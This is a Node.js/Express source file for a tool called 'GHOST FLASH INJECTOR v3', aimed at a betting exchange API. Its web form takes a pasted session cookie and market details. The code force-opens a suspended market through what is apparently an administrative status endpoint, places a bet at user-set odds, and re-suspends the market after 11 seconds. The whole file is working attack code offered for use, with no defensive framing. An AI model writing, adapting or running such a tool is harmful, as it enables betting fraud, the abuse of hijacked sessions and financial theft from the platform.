const axios = require('axios');
const express = require('express');
const app = express();

async function flashExecute(amt, cookie, tid, sid, rate, customUrl, isBack) {
    const headers = { 'Cookie': cookie, 'Content-Type': 'application/json' };
    const api = customUrl || "https://darkexch9.com/api/Exchange/PlaceBet";
    const statusApi = "https://darkexch9.com/api/Exchange/SetMarketStatus";

    try {
        // STEP 1: FORCE OPEN
        await axios.post(statusApi, { "marketId": tid, "status": "OPEN" }, { headers });
        
        // STEP 2: IMMEDIATE BET PLACE
        const payload = { "marketId": tid, "selectionId": sid, "odds": rate || "100", "stake": amt, "isBack": isBack === "true" };
        const res = await axios.post(api, payload, { headers });

        // STEP 3: AUTO-SUSPEND AFTER 11 SECONDS
        setTimeout(async () => {
            await axios.post(statusApi, { "marketId": tid, "status": "SUSPENDED" }, { headers });
            console.log("Market Auto-Locked after 11s");
        }, 11000);

        return res.status === 200 ? "✅ Bet Placed & Timer Started (11s)" : "❌ Bet Failed";
    } catch (e) { return "⚠️ Error: " + e.message; }
}

app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:10px;">
        <h2 style="text-shadow:0 0 10px #f00;">⚡ GHOST FLASH INJECTOR v3 ⚡</h2>
        <div style="border:2px solid #f00;padding:15px;border-radius:10px;background:#111;text-align:left;">
            <input type="text" id="api" placeholder="Custom API (Optional)" style="width:100%;padding:10px;margin-bottom:10px;background:#222;color:#0f0;border:1px solid #333;">
            <input type="text" id="c" placeholder="Paste Fresh Cookie..." style="width:100%;padding:10px;margin-bottom:10px;background:#222;color:#fff;border:1px solid #f00;">
            <div style="display:flex;gap:5px;margin-bottom:10px;">
                <input type="text" id="m" placeholder="Market ID" style="width:50%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                <input type="text" id="sid" placeholder="Selection ID" style="width:50%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
            </div>
            <div style="display:flex;gap:5px;">
                <input type="number" id="r" value="100" style="width:50%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                <input type="number" id="a" placeholder="Amount" style="width:50%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
            </div>
            <div style="margin:15px 0; background:#222; padding:10px; border:1px solid #444; border-radius:5px;">
                <label style="color:#fff;">TYPE:</label>
                <input type="radio" name="bt" value="true" checked> <span style="color:#0af;">BACK</span>
                <input type="radio" name="bt" value="false" style="margin-left:10px;"> <span style="color:#f0a;">LAY</span>
                <span style="color:#666; font-size:10px; margin-left:10px;">🕒 11s Auto-Lock Active</span>
            </div>
            <button onclick="f()" style="width:100%;background:linear-gradient(#f00, #600);color:#fff;padding:20px;border:none;border-radius:5px;font-weight:bold;font-size:18px;box-shadow: 0 0 15px #f00;">🚀 EXECUTE FLASH INJECTION</button>
        </div>
        <p id="s" style="color:#0f0;margin-top:15px;font-weight:bold;"></p>
        <script>
            function f() {
                let type = document.querySelector('input[name="bt"]:checked').value;
                document.getElementById('s').innerText = "Initiating Flash Attack...";
                let url = '/fire?amt='+document.getElementById('a').value +
                          '&cookie='+encodeURIComponent(document.getElementById('c').value) +
                          '&tid='+document.getElementById('m').value +
                          '&sid='+document.getElementById('sid').value +
                          '&rate='+document.getElementById('r').value +
                          '&isBack='+type +
                          '&api='+encodeURIComponent(document.getElementById('api').value);
                fetch(url).then(r => r.text()).then(t => { document.getElementById('s').innerText = t; });
            }
        </script>
    </body></html>`);
});

app.get('/fire', async (req, res) => {
    const result = await flashExecute(req.query.amt, req.query.cookie, req.query.tid, req.query.sid, req.query.rate, req.query.api, req.query.isBack);
    res.send(result);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Flash Injector Live"));
